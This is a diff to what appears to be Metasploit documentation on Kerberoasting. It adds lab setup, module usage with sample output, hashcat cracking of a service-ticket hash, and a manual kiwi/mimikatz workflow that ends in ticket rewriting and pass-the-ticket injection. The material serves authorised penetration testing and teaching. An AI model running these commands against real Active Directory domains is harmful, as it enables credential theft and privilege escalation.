@@ -18,28 +18,92 @@ been granted to the compromised account, boom roasted.
 Any system leveraging Kerberos as a means of authentication e.g. Active Directory, MSSQL, which have Service Principal
 Names (SPN) associated with normal user accounts on the domain.
 
-## Module usage
+## Lab Environment
 
-1. Start msfconsole
-2. Obtain SPNs associated with user accounts from your target
-    1. Do: `use auxiliary/gather/ldap_query`
-    2. Do: `set action ENUM_USER_SPNS_KERBEROAST`
-    3. Run the module and note the discovered SPNs
-3. If you have a Meterpreter session want to use mimikatz support:
-    1. Do: `load kiwi`
-    2. Do: `kerberos_ticket_list`
-4. Export service tickets using the kiwi extension
-    1. Do: `kiwi_cmd kerberos::list /export`
-5. Crack the encryped password in the service ticket using tgsrepcrack.py (more info on this python script below)
-    1. Do:  `python3 tgsrepcrack.py passlist.txt 1-40a10000-Administrator@HTTP\~testService-EXAMPLE.COM.kirbi`
-6. Rewrite the service tickets using kerberoast.py (more info on this python script below)
-    1. Do:  `python3  kerberoast.py -p N0tpassword! -r 1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM.kirbi -w Administrator.kirbi -u 500`
-7. Finally inject the ticket back into RAM using Meterpreter's kiwi extension
-    1. `meterpreter > kiwi_cmd kerberos::ptt Administrator.kirbi`
+For testing purposes on an Active Directory environment you can create a user account and register an SPN manually as an
+example of this technique:
+
+```
+# Create a basic user account with a weak password for our service
+net user /add svc_kerberoastable password123
+
+# Mark the account and password as never expiring, to ensure the lab setup still works in the future
+net user svc_kerberoastable /expires:never
+powershell /c Set-AdUser -Identity svc_kerberoastable -PasswordNeverExpires $true
+
+# Create a Service Principal Name which uses the user account with a weak password
+cmd /c setspn -a %computername%/svc_kerberoastable.%userdnsdomain%:1337 %userdomain%\svc_kerberoastable
+```
 
 ## Scenarios
 
-### SPN Discovery
+### Using get_user_spns
+
+The easiest way to enumerate Kerberoastable accounts is with the `auxiliary/gather/get_user_spns` module which internally leverages Impacket.
+This module will automatically query LDAP for Kerberoastable SPNs and request a Kerberos service ticket that may be encrypted using the weak password
+which can be bruteforced:
+
+```
+use auxiliary/gather/get_user_spns
+run rhost=192.168.123.13 user=<username> pass=<password> domain=<domain>
+```
+
+If you followed the lab setup setup above, this should output the following result:
+
+```
+msf6 auxiliary(gather/get_user_spns) > run rhost=192.168.123.13 user=Administrator pass=p4$$w0rd domain=adf3.local
+
+[*] Running for 192.168.123.13...
+[+] ServicePrincipalName                    Name                MemberOf  PasswordLastSet             LastLogon  Delegation
+[+] --------------------------------------  ------------------  --------  --------------------------  ---------  ----------
+[+] DC3/svc_kerberoastable.ADF3.LOCAL:1337  svc_kerberoastable            2023-01-23 23:52:19.445592  <never>
+[+] $krb5tgs$23$*svc_kerberoastable$ADF3.LOCAL$adf3.local/svc_kerberoastable*$c2e73c1dcdcef4c926cb263abedf75ed$263fea3ad446bd6b4b8... etc etc ...
+```
+
+The final line contains the service ticket hash in a crackable format. Next paste this hash `$krb5tgs$23$*svc_kerberoastable$ADF3.LOCAL$adf3.local/svc_kerberoastable*$c2e73c1..etc etc...` into a new file called `hash.txt`
+You can run Hashcat to crack the hash with a wordlist of choice, and see if the status of the hash has been marked as cracked:
+
+```
+$ hashcat -m 13100 --force -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+... etc ...
+Session..........: hashcat
+Status...........: Cracked
+... etc ...
+```
+
+If the password has been cracked you can view the result at a later date with the above command and `--show` appended:
+
+```
+$ hashcat -m 13100 --force -a 0 hash.txt /usr/share/wordlists/rockyou.txt --show
+$krb5tgs$23$*svc_kerberoastable$ADF3.LOCAL$adf3.local/svc_kerberoastable*$c2e73c1dcdcef4c926cb...etc etc...:password123
+                                                                                                         ^ cracked password
+```
+
+Now that you have access to the password of the service account, you can use this to enumerate further in the AD environment.
+
+### Manual workflow
+
+An alternative to the easier `get_user_spns` module above is the more manual process of running the LDAP query module to
+find Kerberoastable accounts, requesting service tickets with Kiwi, converting the Kiwi ticket to a format usable by hashcat,
+and cracking the hash.
+
+1. Start msfconsole
+2. Obtain SPNs associated with user accounts from your target
+   1. Do: `use auxiliary/gather/ldap_query`
+   2. Do: `set action ENUM_USER_SPNS_KERBEROAST`
+   3. Run the module and note the discovered SPNs
+3. From your Meterpreter session:
+   1. Do: `load kiwi`
+   2. Do: Request a kerberos ticket for SPN found by the ldap_query module: `kiwi_cmd kerberos::ask /target:https/TSTWLPT1000000`
+   3. Do: `kerberos_ticket_list`
+4. Export service tickets using the kiwi extension
+   1. Do: `kiwi_cmd kerberos::list /export`
+5. Crack the encrypted password in the service ticket using tgsrepcrack.py (more info on this python script below)
+   1. Do:  `python3 tgsrepcrack.py passlist.txt 1-40a10000-Administrator@HTTP\~testService-EXAMPLE.COM.kirbi`
+6. Rewrite the service tickets using kerberoast.py (more info on this python script below)
+   1. Do:  `python3  kerberoast.py -p N0tpassword! -r 1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM.kirbi -w Administrator.kirbi -u 500`
+7. Finally inject the ticket back into RAM using Meterpreter's kiwi extension
+   1. `meterpreter > kiwi_cmd kerberos::ptt Administrator.kirbi`
 
 First an SPN needs to be found. This can be done in a number of ways - including using metasploit's
 very own `auxiliary/gather/ldap_query` module:
@@ -100,7 +164,7 @@ CN=LESSIE_PHILLIPS OU=Test OU=GOO OU=Stage DC=example DC=com
 
 Great, we now have a couple SPNs to move forward with.
 
-### Request Service Tickets - with kiwi
+**Request Service Tickets - with kiwi**
 
 If you have a running Meterpreter session you can request a Service Ticket using the kiwi extension and one of the SPNs
 found above:
@@ -151,7 +215,7 @@ meterpreter > kerberos_ticket_list
    Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
 ```
 
-### Export Service Tickets
+**Export Service Tickets**
 
 ```
 meterpreter > kiwi_cmd kerberos::list /export
@@ -203,7 +267,7 @@ MDAwMA==
    * Saved to file     : 1-40a10000-Administrator@https~TSTWLPT1000000-EXAMPLE.COM.kirbi
 ```
 
-### Crack Service Tickets
+**Crack Kiwi's Service Tickets**
 
 To crack the service ticket a number of tools can be used. In this example we'll use hashcat. First we need to convert
 the ticket we retrieved in the `.kirbi` format to a format parsable by hashcat. The script **kirbi2john** is part of
@@ -321,7 +385,7 @@ $krb5tgs$23$*1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM*$2b5cda0496cd
 39efa046757894679beba5b296fe0cdc11100b9a536264cb5e3cb3c6d0426acaa7dd3928895d32973fab2695476093ddbd087c115e3:N0tpassword!
 ```
 
-### Rewrite Service Tickets & RAM Injection
+**Rewrite Service Tickets & RAM Injection**
 
 Kerberos tickets are signed with the NTLM hash of the password. If the ticket hash has been cracked then it is possible
 to rewrite the ticket with [Kerberoast](https://github.com/nidem/kerberoast) python script. This tactic will allow users
